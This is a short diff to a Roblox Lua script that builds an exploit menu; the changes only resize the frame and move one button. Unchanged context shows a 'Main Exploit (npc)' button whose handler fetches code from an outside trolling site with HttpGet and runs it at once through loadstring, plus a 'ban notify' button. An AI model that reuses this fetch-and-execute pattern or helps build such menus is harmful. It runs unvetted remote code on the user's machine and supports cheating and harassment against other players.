@@ -17,7 +17,7 @@ gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 -- Main Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 400, 0, 550) -- Adjusted size to fit all buttons
+mainFrame.Size = UDim2.new(0, 400, 0, 575) -- Adjusted size to fit all buttons
 mainFrame.Position = UDim2.new(0.5, -200, 0.5, -325)
 mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 mainFrame.BorderSizePixel = 0
@@ -107,7 +107,7 @@ end, 320)
 
 createButton("Main Exploit (npc)", function()
     loadstring(game:HttpGet('https://robloxtrollers.xyz/loadstring/npc.lua'))()
-end, 370)
+end, 470)
 
 createButton("ban notify", function()
     local Players = game:GetService("Players")
